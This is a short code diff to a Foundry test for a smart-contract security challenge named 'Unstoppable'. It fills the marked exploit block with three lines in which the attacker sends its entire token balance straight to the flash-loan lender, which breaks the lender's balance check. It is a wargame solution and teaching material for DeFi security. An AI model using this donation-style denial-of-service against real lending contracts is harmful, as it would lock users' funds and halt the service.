@@ -47,9 +47,7 @@ contract Unstoppable is Test {
 
         // Show it's possible for someUser to take out a flash loan
         vm.startPrank(someUser);
-        receiverUnstoppable = new ReceiverUnstoppable(
-            address(unstoppableLender)
-        );
+        receiverUnstoppable = new ReceiverUnstoppable(address(unstoppableLender));
         vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
         receiverUnstoppable.executeFlashLoan(10);
         vm.stopPrank();
@@ -60,6 +58,9 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        dvt.transfer(address(unstoppableLender), dvt.balanceOf(attacker));
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
